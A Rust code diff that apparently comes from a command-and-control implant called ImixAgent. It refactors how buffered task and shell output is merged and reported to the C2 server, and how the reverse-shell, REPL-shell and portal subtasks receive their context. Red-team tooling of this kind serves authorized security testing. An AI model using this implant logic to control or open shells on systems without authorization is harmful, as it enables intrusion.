@@ -1,8 +1,13 @@
-use anyhow::{Context, Result};
+use anyhow::{Context as AnyhowContext, Result};
 use eldritch::agent::agent::Agent;
+use eldritch_agent::Context;
 use pb::c2::host::Platform;
 use pb::c2::transport::Type;
-use pb::c2::{self, ClaimTasksRequest, TaskContext};
+use pb::c2::{
+    self, ClaimTasksRequest, ReportOutputRequest, ReportShellTaskOutputMessage,
+    ReportTaskOutputMessage, ShellTaskContext, ShellTaskOutput, TaskContext, TaskOutput,
+    report_output_request,
+};
 use pb::config::Config;
 use std::collections::{BTreeMap, BTreeSet};
 use std::sync::{Arc, Mutex};
@@ -24,8 +29,8 @@ pub struct ImixAgent<T: Transport> {
     runtime_handle: tokio::runtime::Handle,
     pub task_registry: Arc<TaskRegistry>,
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
-    pub output_tx: std::sync::mpsc::SyncSender<c2::ReportTaskOutputRequest>,
-    pub output_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportTaskOutputRequest>>>,
+    pub output_tx: std::sync::mpsc::SyncSender<c2::ReportOutputRequest>,
+    pub output_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportOutputRequest>>>,
     pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
 }
 
@@ -140,99 +145,99 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             return;
         }
 
-        let mut merged_task_outputs: BTreeMap<i64, c2::ReportTaskOutputRequest> = BTreeMap::new();
-        let mut merged_shell_outputs: BTreeMap<i64, c2::ReportTaskOutputRequest> = BTreeMap::new();
+        let mut merged_task_outputs: BTreeMap<i64, (TaskContext, TaskOutput)> = BTreeMap::new();
+        let mut merged_shell_outputs: BTreeMap<i64, (ShellTaskContext, ShellTaskOutput)> =
+            BTreeMap::new();
 
         for output in outputs {
-            // Handle Task Output
-            if let Some(new_out) = &output.output {
-                let task_id = output
-                    .context
-                    .as_ref()
-                    .map(|c| c.task_id)
-                    .unwrap_or_default();
-
-                use std::collections::btree_map::Entry;
-                match merged_task_outputs.entry(task_id) {
-                    Entry::Occupied(mut entry) => {
-                        let existing = entry.get_mut();
-                        if let Some(existing_out) = &mut existing.output {
-                            existing_out.output.push_str(&new_out.output);
-                            match (&mut existing_out.error, &new_out.error) {
-                                (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
-                                (None, Some(e2)) => existing_out.error = Some(e2.clone()),
-                                _ => {}
+            if let Some(msg) = output.message {
+                match msg {
+                    report_output_request::Message::TaskOutput(m) => {
+                        if let (Some(ctx), Some(new_out)) = (m.context, m.output) {
+                            let task_id = ctx.task_id;
+                            use std::collections::btree_map::Entry;
+                            match merged_task_outputs.entry(task_id) {
+                                Entry::Occupied(mut entry) => {
+                                    let (_, existing_out) = entry.get_mut();
+                                    existing_out.output.push_str(&new_out.output);
+                                    match (&mut existing_out.error, &new_out.error) {
+                                        (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
+                                        (None, Some(e2)) => existing_out.error = Some(e2.clone()),
+                                        _ => {}
+                                    }
+                                    if new_out.exec_finished_at.is_some() {
+                                        existing_out.exec_finished_at =
+                                            new_out.exec_finished_at.clone();
+                                    }
+                                }
+                                Entry::Vacant(entry) => {
+                                    entry.insert((ctx, new_out));
+                                }
                             }
-                            if new_out.exec_finished_at.is_some() {
-                                existing_out.exec_finished_at = new_out.exec_finished_at.clone();
-                            }
-                        } else {
-                            existing.output = Some(new_out.clone());
-                        }
-                        existing.context = output.context.clone();
-                    }
-                    Entry::Vacant(entry) => {
-                        let req = c2::ReportTaskOutputRequest {
-                            output: Some(new_out.clone()),
-                            context: output.context.clone(),
-                            shell_task_output: None,
-                        };
-                        entry.insert(req);
-                    }
-                }
-            }
-
-            // Handle Shell Task Output
-            if let Some(new_shell_out) = &output.shell_task_output {
-                let shell_task_id = new_shell_out.id;
-
-                use std::collections::btree_map::Entry;
-                match merged_shell_outputs.entry(shell_task_id) {
-                    Entry::Occupied(mut entry) => {
-                        let existing = entry.get_mut();
-                        if let Some(existing_out) = &mut existing.shell_task_output {
-                            existing_out.output.push_str(&new_shell_out.output);
-                            match (&mut existing_out.error, &new_shell_out.error) {
-                                (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
-                                (None, Some(e2)) => existing_out.error = Some(e2.clone()),
-                                _ => {}
-                            }
-                            if new_shell_out.exec_finished_at.is_some() {
-                                existing_out.exec_finished_at =
-                                    new_shell_out.exec_finished_at.clone();
-                            }
-                        } else {
-                            existing.shell_task_output = Some(new_shell_out.clone());
                         }
                     }
-                    Entry::Vacant(entry) => {
-                        let req = c2::ReportTaskOutputRequest {
-                            output: None,
-                            context: None,
-                            shell_task_output: Some(new_shell_out.clone()),
-                        };
-                        entry.insert(req);
+                    report_output_request::Message::ShellTaskOutput(m) => {
+                        if let (Some(ctx), Some(new_shell_out)) = (m.context, m.output) {
+                            let shell_task_id = ctx.shell_task_id;
+                            use std::collections::btree_map::Entry;
+                            match merged_shell_outputs.entry(shell_task_id) {
+                                Entry::Occupied(mut entry) => {
+                                    let (_, existing_out) = entry.get_mut();
+                                    existing_out.output.push_str(&new_shell_out.output);
+                                    match (&mut existing_out.error, &new_shell_out.error) {
+                                        (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
+                                        (None, Some(e2)) => existing_out.error = Some(e2.clone()),
+                                        _ => {}
+                                    }
+                                    if new_shell_out.exec_finished_at.is_some() {
+                                        existing_out.exec_finished_at =
+                                            new_shell_out.exec_finished_at.clone();
+                                    }
+                                }
+                                Entry::Vacant(entry) => {
+                                    entry.insert((ctx, new_shell_out));
+                                }
+                            }
+                        }
                     }
                 }
             }
         }
 
         let mut transport = self.transport.write().await;
-        for (_, output) in merged_task_outputs {
+        for (_, (ctx, output)) in merged_task_outputs {
             #[cfg(debug_assertions)]
             log::info!("Task Output: {output:#?}");
 
-            if let Err(_e) = transport.report_task_output(output).await {
+            let req = ReportOutputRequest {
+                message: Some(report_output_request::Message::TaskOutput(
+                    ReportTaskOutputMessage {
+                        context: Some(ctx),
+                        output: Some(output),
+                    },
+                )),
+            };
+
+            if let Err(_e) = transport.report_output(req).await {
                 #[cfg(debug_assertions)]
                 log::error!("Failed to report task output: {_e}");
             }
         }
 
-        for (_, output) in merged_shell_outputs {
+        for (_, (ctx, output)) in merged_shell_outputs {
             #[cfg(debug_assertions)]
             log::info!("Shell Task Output: {output:#?}");
 
-            if let Err(_e) = transport.report_task_output(output).await {
+            let req = ReportOutputRequest {
+                message: Some(report_output_request::Message::ShellTaskOutput(
+                    ReportShellTaskOutputMessage {
+                        context: Some(ctx),
+                        output: Some(output),
+                    },
+                )),
+            };
+
+            if let Err(_e) = transport.report_output(req).await {
                 #[cfg(debug_assertions)]
                 log::error!("Failed to report shell task output: {_e}");
             }
@@ -423,38 +428,46 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         self.with_transport(|mut t| async move { t.report_process_list(req).await })
     }
 
-    fn report_task_output(
+    fn report_output(
         &self,
-        req: c2::ReportTaskOutputRequest,
-    ) -> Result<c2::ReportTaskOutputResponse, String> {
+        req: c2::ReportOutputRequest,
+    ) -> Result<c2::ReportOutputResponse, String> {
         // Buffer output instead of sending immediately
         self.output_tx
             .try_send(req)
             .map_err(|_| "Output buffer full".to_string())?;
-        Ok(c2::ReportTaskOutputResponse {})
+        Ok(c2::ReportOutputResponse {})
     }
 
-    fn start_reverse_shell(
-        &self,
-        task_context: TaskContext,
-        cmd: Option<String>,
-    ) -> Result<(), String> {
-        self.spawn_subtask(task_context.task_id, move |transport| async move {
-            run_reverse_shell_pty(task_context, cmd, transport).await
+    fn start_reverse_shell(&self, context: Context, cmd: Option<String>) -> Result<(), String> {
+        let id = match &context {
+            Context::Task(tc) => tc.task_id,
+            Context::ShellTask(stc) => stc.shell_task_id,
+        };
+        self.spawn_subtask(id, move |transport| async move {
+            run_reverse_shell_pty(context, cmd, transport).await
         })
     }
 
-    fn create_portal(&self, task_context: TaskContext) -> Result<(), String> {
+    fn create_portal(&self, context: Context) -> Result<(), String> {
         let shell_manager_tx = self.shell_manager_tx.clone();
-        self.spawn_subtask(task_context.task_id, move |transport| async move {
-            run_create_portal(task_context, transport, shell_manager_tx).await
+        let id = match &context {
+            Context::Task(tc) => tc.task_id,
+            Context::ShellTask(stc) => stc.shell_task_id,
+        };
+        self.spawn_subtask(id, move |transport| async move {
+            run_create_portal(context, transport, shell_manager_tx).await
         })
     }
 
-    fn start_repl_reverse_shell(&self, task_context: TaskContext) -> Result<(), String> {
+    fn start_repl_reverse_shell(&self, context: Context) -> Result<(), String> {
         let agent = self.clone();
-        self.spawn_subtask(task_context.task_id, move |transport| async move {
-            run_repl_reverse_shell(task_context, transport, agent).await
+        let id = match &context {
+            Context::Task(tc) => tc.task_id,
+            Context::ShellTask(stc) => stc.shell_task_id,
+        };
+        self.spawn_subtask(id, move |transport| async move {
+            run_repl_reverse_shell(context, transport, agent).await
         })
     }
 
